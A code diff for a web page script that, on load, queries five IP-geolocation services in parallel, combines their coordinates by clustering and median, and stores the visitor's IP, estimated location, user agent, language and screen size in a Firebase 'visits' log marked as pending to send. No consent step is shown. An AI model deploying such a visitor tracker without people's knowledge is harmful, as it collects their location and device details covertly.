@@ -20,86 +20,181 @@ const app = initializeApp({
 const db = getDatabase(app);
 
 const logEl = document.getElementById("log");
-function log(msg) {
-  console.log(msg);
-  logEl.textContent += msg + "\n";
-  document.getElementById("status").textContent = msg;
+function log(m) {
+  console.log(m);
+  logEl.textContent += m + "\n";
+  document.getElementById("status").textContent = m;
 }
 
 function countryFlag(code) {
   if (!code || code.length !== 2) return "🏳";
   code = code.toUpperCase();
-  return String.fromCodePoint(
-    0x1F1E6 + code.charCodeAt(0) - 65,
-    0x1F1E6 + code.charCodeAt(1) - 65
-  );
+  return String.fromCodePoint(0x1F1E6 + code.charCodeAt(0) - 65,
+                              0x1F1E6 + code.charCodeAt(1) - 65);
 }
 
-async function getIP() {
-  const services = [
-    {
-      url: "https://ipwho.is/",
-      map: d => ({
-        ip: d.ip, city: d.city, region: d.region,
-        country: d.country_code,
-        org: d.connection && d.connection.isp,
-        latitude: d.latitude, longitude: d.longitude
-      })
-    },
-    {
-      url: "https://ipapi.co/json/",
-      map: d => ({
-        ip: d.ip, city: d.city, region: d.region,
-        country: d.country_code,
-        org: d.org,
-        latitude: d.latitude, longitude: d.longitude
-      })
-    },
-    {
-      url: "https://ipinfo.io/json",
-      map: d => {
-        const parts = (d.loc || ",").split(",");
-        return {
-          ip: d.ip, city: d.city, region: d.region,
-          country: d.country,
-          org: d.org,
-          latitude: parts[0], longitude: parts[1]
-        };
-      }
+const APIS = [
+  {
+    name: "ipwho.is",
+    url: "https://ipwho.is/",
+    map: d => d.ip ? {
+      ip: d.ip, lat: d.latitude, lng: d.longitude,
+      city: d.city, region: d.region, country: d.country_code,
+      org: d.connection?.isp, acc: d.accuracy_radius
+    } : null
+  },
+  {
+    name: "ipapi.co",
+    url: "https://ipapi.co/json/",
+    map: d => d.ip ? {
+      ip: d.ip, lat: d.latitude, lng: d.longitude,
+      city: d.city, region: d.region, country: d.country_code,
+      org: d.org, acc: null
+    } : null
+  },
+  {
+    name: "ipinfo.io",
+    url: "https://ipinfo.io/json",
+    map: d => {
+      if (!d.ip) return null;
+      const [lat, lng] = (d.loc || ",").split(",").map(Number);
+      return {
+        ip: d.ip, lat, lng,
+        city: d.city, region: d.region, country: d.country,
+        org: d.org, acc: null
+      };
     }
-  ];
+  },
+  {
+    name: "ip-api.com",
+    url: "http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,lat,lon,isp,query",
+    map: d => d.status === "success" ? {
+      ip: d.query, lat: d.lat, lng: d.lon,
+      city: d.city, region: d.regionName, country: d.countryCode,
+      org: d.isp, acc: null
+    } : null
+  },
+  {
+    name: "bigdatacloud",
+    url: "https://api.bigdatacloud.net/data/reverse-geocode-client",
+    map: d => d.latitude ? {
+      ip: "?", lat: d.latitude, lng: d.longitude,
+      city: d.city, region: d.principalSubdivision, country: d.countryCode,
+      org: "?", acc: null
+    } : null
+  }
+];
 
-  for (const s of services) {
+function haversine(a, b, c, d) {
+  const R = 6371;
+  const dLat = (c - a) * Math.PI / 180;
+  const dLng = (d - b) * Math.PI / 180;
+  const x = Math.sin(dLat/2)**2 +
+            Math.cos(a*Math.PI/180) * Math.cos(c*Math.PI/180) *
+            Math.sin(dLng/2)**2;
+  return 2 * R * Math.asin(Math.sqrt(x));
+}
+
+function median(arr) {
+  const s = [...arr].sort((a, b) => a - b);
+  const m = Math.floor(s.length / 2);
+  return s.length % 2 ? s[m] : (s[m-1] + s[m]) / 2;
+}
+
+async function fetchAll() {
+  const promises = APIS.map(async api => {
     try {
-      log("Thử " + s.url);
-      const r = await fetch(s.url, { cache: "no-store" });
+      const r = await fetch(api.url, { cache: "no-store" });
       if (!r.ok) throw new Error("HTTP " + r.status);
       const d = await r.json();
-      const m = s.map(d);
-      if (!m.ip) throw new Error("Không có IP");
-      log("OK: " + m.ip + " | " + m.country);
-      return m;
+      const m = api.map(d);
+      if (m && m.lat && m.lng) {
+        log("✓ " + api.name + ": " + m.lat + ", " + m.lng);
+        return { ...m, source: api.name };
+      }
+      log("✗ " + api.name + ": không có tọa độ");
+      return null;
     } catch (e) {
-      log("Fail " + s.url + " -> " + e.message);
+      log("✗ " + api.name + ": " + e.message);
+      return null;
+    }
+  });
+
+  const results = (await Promise.all(promises)).filter(Boolean);
+  return results;
+}
+
+function clusterBest(results) {
+  if (results.length === 0) return null;
+  if (results.length === 1) return results[0];
+
+  // Tìm điểm có nhiều hàng xóm gần nhất
+  let bestScore = -1;
+  let best = null;
+
+  for (const r of results) {
+    let score = 0;
+    for (const o of results) {
+      if (o === r) continue;
+      const d = haversine(r.lat, r.lng, o.lat, o.lng);
+      if (d < 50) score += 1 / (d + 1);
+    }
+    if (score > bestScore) {
+      bestScore = score;
+      best = r;
     }
   }
-  throw new Error("Cả 3 dịch vụ IP đều fail");
+  return best;
+}
+
+function weightedAvg(results) {
+  if (results.length === 0) return null;
+
+  const center = clusterBest(results);
+  const filtered = results.filter(r =>
+    haversine(center.lat, center.lng, r.lat, r.lng) < 100
+  );
+
+  log("Lọc: " + filtered.length + "/" + results.length + " điểm gần tâm");
+
+  if (filtered.length === 0) return center;
+
+  const latMed = median(filtered.map(r => r.lat));
+  const lngMed = median(filtered.map(r => r.lng));
+
+  return {
+    lat: latMed,
+    lng: lngMed,
+    ip: filtered[0].ip,
+    city: filtered[0].city,
+    region: filtered[0].region,
+    country: filtered[0].country,
+    org: filtered[0].org,
+    sources: filtered.map(r => r.source).join(", ")
+  };
 }
 
 (async () => {
   try {
-    log("Bắt đầu");
-    const info = await getIP();
+    log("Bắt đầu — gọi " + APIS.length + " API song song...");
+    const results = await fetchAll();
+    log("Nhận " + results.length + "/" + APIS.length + " kết quả");
+
+    if (results.length === 0) throw new Error("Không API nào trả về");
+
+    const best = weightedAvg(results);
+    log("Tọa độ cuối: " + best.lat + ", " + best.lng);
 
     const record = {
-      ip: info.ip,
-      org: info.org || "?",
-      country: info.country || "?",
-      flag: countryFlag(info.country),
-      region: info.region || "?",
-      city: info.city || "?",
-      latitude: info.latitude || "",
-      longitude: info.longitude || "",
+      ip: best.ip,
+      org: best.org || "?",
+      country: best.country || "?",
+      flag: countryFlag(best.country),
+      region: best.region || "?",
+      city: best.city || "?",
+      latitude: best.lat,
+      longitude: best.lng,
+      sources: best.sources,
       userAgent: navigator.userAgent,
       language: navigator.language,
       screen: screen.width + "x" + screen.height,
@@ -108,8 +203,6 @@ async function getIP() {
       status: "⏳ chờ gửi",
       sent_at: ""
     };
-
-    log("Dữ liệu: " + JSON.stringify(record));
 
     const result = await push(ref(db, "visits"), record);
     log("Firebase OK, key=" + result.key);
